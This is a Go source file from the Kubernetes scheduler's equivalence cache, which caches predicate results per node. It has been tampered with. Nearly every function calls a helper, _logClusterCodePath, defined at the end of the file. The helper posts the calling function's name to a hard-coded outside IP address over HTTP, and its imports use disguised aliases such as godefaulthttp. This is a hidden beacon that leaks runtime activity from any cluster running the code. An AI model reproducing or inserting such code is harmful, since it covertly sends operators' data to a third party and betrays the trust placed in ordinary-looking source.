package equivalence

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "hash/fnv"
 "sync"
 "k8s.io/api/core/v1"
 "k8s.io/apimachinery/pkg/util/sets"
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 "k8s.io/klog"
 "k8s.io/kubernetes/pkg/features"
 "k8s.io/kubernetes/pkg/scheduler/algorithm"
 "k8s.io/kubernetes/pkg/scheduler/algorithm/predicates"
 schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
 "k8s.io/kubernetes/pkg/scheduler/metrics"
 hashutil "k8s.io/kubernetes/pkg/util/hash"
)

type nodeMap map[string]*NodeCache
type Cache struct {
 mu             sync.RWMutex
 nodeToCache    nodeMap
 predicateIDMap map[string]int
}

func NewCache(predicates []string) *Cache {
 _logClusterCodePath()
 defer _logClusterCodePath()
 predicateIDMap := make(map[string]int, len(predicates))
 for id, predicate := range predicates {
  predicateIDMap[predicate] = id
 }
 return &Cache{nodeToCache: make(nodeMap), predicateIDMap: predicateIDMap}
}

type NodeCache struct {
 mu                           sync.RWMutex
 cache                        predicateMap
 generation                   uint64
 snapshotGeneration           uint64
 predicateGenerations         []uint64
 snapshotPredicateGenerations []uint64
}

func newNodeCache(n int) *NodeCache {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &NodeCache{cache: make(predicateMap, n), predicateGenerations: make([]uint64, n), snapshotPredicateGenerations: make([]uint64, n)}
}
func (c *Cache) Snapshot() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.mu.RLock()
 defer c.mu.RUnlock()
 for _, n := range c.nodeToCache {
  n.mu.Lock()
  copy(n.snapshotPredicateGenerations, n.predicateGenerations)
  n.snapshotGeneration = n.generation
  n.mu.Unlock()
 }
 return
}
func (c *Cache) GetNodeCache(name string) (nodeCache *NodeCache, exists bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.mu.Lock()
 defer c.mu.Unlock()
 if nodeCache, exists = c.nodeToCache[name]; !exists {
  nodeCache = newNodeCache(len(c.predicateIDMap))
  c.nodeToCache[name] = nodeCache
 }
 return
}
func (c *Cache) LoadNodeCache(node string) *NodeCache {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.mu.RLock()
 defer c.mu.RUnlock()
 return c.nodeToCache[node]
}
func (c *Cache) predicateKeysToIDs(predicateKeys sets.String) []int {
 _logClusterCodePath()
 defer _logClusterCodePath()
 predicateIDs := make([]int, 0, len(predicateKeys))
 for predicateKey := range predicateKeys {
  if id, ok := c.predicateIDMap[predicateKey]; ok {
   predicateIDs = append(predicateIDs, id)
  } else {
   klog.Errorf("predicate key %q not found", predicateKey)
  }
 }
 return predicateIDs
}
func (c *Cache) InvalidatePredicates(predicateKeys sets.String) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(predicateKeys) == 0 {
  return
 }
 c.mu.RLock()
 defer c.mu.RUnlock()
 predicateIDs := c.predicateKeysToIDs(predicateKeys)
 for _, n := range c.nodeToCache {
  n.invalidatePreds(predicateIDs)
 }
 klog.V(5).Infof("Cache invalidation: node=*,predicates=%v", predicateKeys)
}
func (c *Cache) InvalidatePredicatesOnNode(nodeName string, predicateKeys sets.String) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(predicateKeys) == 0 {
  return
 }
 c.mu.RLock()
 defer c.mu.RUnlock()
 predicateIDs := c.predicateKeysToIDs(predicateKeys)
 if n, ok := c.nodeToCache[nodeName]; ok {
  n.invalidatePreds(predicateIDs)
 }
 klog.V(5).Infof("Cache invalidation: node=%s,predicates=%v", nodeName, predicateKeys)
}
func (c *Cache) InvalidateAllPredicatesOnNode(nodeName string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c.mu.RLock()
 defer c.mu.RUnlock()
 if node, ok := c.nodeToCache[nodeName]; ok {
  node.invalidate()
 }
 klog.V(5).Infof("Cache invalidation: node=%s,predicates=*", nodeName)
}
func (c *Cache) InvalidateCachedPredicateItemForPodAdd(pod *v1.Pod, nodeName string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 invalidPredicates := sets.NewString(predicates.GeneralPred)
 for _, vol := range pod.Spec.Volumes {
  if vol.PersistentVolumeClaim != nil {
   invalidPredicates.Insert(predicates.MaxEBSVolumeCountPred, predicates.MaxGCEPDVolumeCountPred, predicates.MaxAzureDiskVolumeCountPred)
   if utilfeature.DefaultFeatureGate.Enabled(features.AttachVolumeLimit) {
    invalidPredicates.Insert(predicates.MaxCSIVolumeCountPred)
   }
  } else {
   if vol.AWSElasticBlockStore != nil {
    invalidPredicates.Insert(predicates.MaxEBSVolumeCountPred)
   }
   if vol.GCEPersistentDisk != nil {
    invalidPredicates.Insert(predicates.MaxGCEPDVolumeCountPred)
   }
   if vol.AzureDisk != nil {
    invalidPredicates.Insert(predicates.MaxAzureDiskVolumeCountPred)
   }
  }
 }
 c.InvalidatePredicatesOnNode(nodeName, invalidPredicates)
}

type Class struct{ hash uint64 }

func NewClass(pod *v1.Pod) *Class {
 _logClusterCodePath()
 defer _logClusterCodePath()
 equivalencePod := getEquivalencePod(pod)
 if equivalencePod != nil {
  hash := fnv.New32a()
  hashutil.DeepHashObject(hash, equivalencePod)
  return &Class{hash: uint64(hash.Sum32())}
 }
 return nil
}

type predicateMap []resultMap
type resultMap map[uint64]predicateResult
type predicateResult struct {
 Fit         bool
 FailReasons []algorithm.PredicateFailureReason
}

func (n *NodeCache) RunPredicate(pred algorithm.FitPredicate, predicateKey string, predicateID int, pod *v1.Pod, meta algorithm.PredicateMetadata, nodeInfo *schedulercache.NodeInfo, equivClass *Class) (bool, []algorithm.PredicateFailureReason, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if nodeInfo == nil || nodeInfo.Node() == nil {
  return false, []algorithm.PredicateFailureReason{}, fmt.Errorf("nodeInfo is nil or node is invalid")
 }
 result, ok := n.lookupResult(pod.GetName(), nodeInfo.Node().GetName(), predicateKey, predicateID, equivClass.hash)
 if ok {
  return result.Fit, result.FailReasons, nil
 }
 fit, reasons, err := pred(pod, meta, nodeInfo)
 if err != nil {
  return fit, reasons, err
 }
 n.updateResult(pod.GetName(), predicateKey, predicateID, fit, reasons, equivClass.hash, nodeInfo)
 return fit, reasons, nil
}
func (n *NodeCache) updateResult(podName, predicateKey string, predicateID int, fit bool, reasons []algorithm.PredicateFailureReason, equivalenceHash uint64, nodeInfo *schedulercache.NodeInfo) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if nodeInfo == nil || nodeInfo.Node() == nil {
  metrics.EquivalenceCacheWrites.WithLabelValues("discarded_bad_node").Inc()
  return
 }
 predicateItem := predicateResult{Fit: fit, FailReasons: reasons}
 n.mu.Lock()
 defer n.mu.Unlock()
 if (n.snapshotGeneration != n.generation) || (n.snapshotPredicateGenerations[predicateID] != n.predicateGenerations[predicateID]) {
  metrics.EquivalenceCacheWrites.WithLabelValues("discarded_stale").Inc()
  return
 }
 if predicates := n.cache[predicateID]; predicates != nil {
  predicates[equivalenceHash] = predicateItem
 } else {
  n.cache[predicateID] = resultMap{equivalenceHash: predicateItem}
 }
 n.predicateGenerations[predicateID]++
 klog.V(5).Infof("Cache update: node=%s, predicate=%s,pod=%s,value=%v", nodeInfo.Node().Name, predicateKey, podName, predicateItem)
}
func (n *NodeCache) lookupResult(podName, nodeName, predicateKey string, predicateID int, equivalenceHash uint64) (value predicateResult, ok bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 n.mu.RLock()
 defer n.mu.RUnlock()
 value, ok = n.cache[predicateID][equivalenceHash]
 if ok {
  metrics.EquivalenceCacheHits.Inc()
 } else {
  metrics.EquivalenceCacheMisses.Inc()
 }
 return value, ok
}
func (n *NodeCache) invalidatePreds(predicateIDs []int) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 n.mu.Lock()
 defer n.mu.Unlock()
 for _, predicateID := range predicateIDs {
  n.cache[predicateID] = nil
  n.predicateGenerations[predicateID]++
 }
}
func (n *NodeCache) invalidate() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 n.mu.Lock()
 defer n.mu.Unlock()
 n.cache = make(predicateMap, len(n.cache))
 n.generation++
}

type equivalencePod struct {
 Namespace      *string
 Labels         map[string]string
 Affinity       *v1.Affinity
 Containers     []v1.Container
 InitContainers []v1.Container
 NodeName       *string
 NodeSelector   map[string]string
 Tolerations    []v1.Toleration
 Volumes        []v1.Volume
}

func getEquivalencePod(pod *v1.Pod) *equivalencePod {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ep := &equivalencePod{Namespace: &pod.Namespace, Labels: pod.Labels, Affinity: pod.Spec.Affinity, Containers: pod.Spec.Containers, InitContainers: pod.Spec.InitContainers, NodeName: &pod.Spec.NodeName, NodeSelector: pod.Spec.NodeSelector, Tolerations: pod.Spec.Tolerations, Volumes: pod.Spec.Volumes}
 if len(ep.Containers) == 0 {
  ep.Containers = nil
 }
 if len(ep.InitContainers) == 0 {
  ep.InitContainers = nil
 }
 if len(ep.Tolerations) == 0 {
  ep.Tolerations = nil
 }
 if len(ep.Volumes) == 0 {
  ep.Volumes = nil
 }
 if len(ep.Labels) == 0 {
  ep.Labels = nil
 }
 if len(ep.NodeSelector) == 0 {
  ep.NodeSelector = nil
 }
 return ep
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
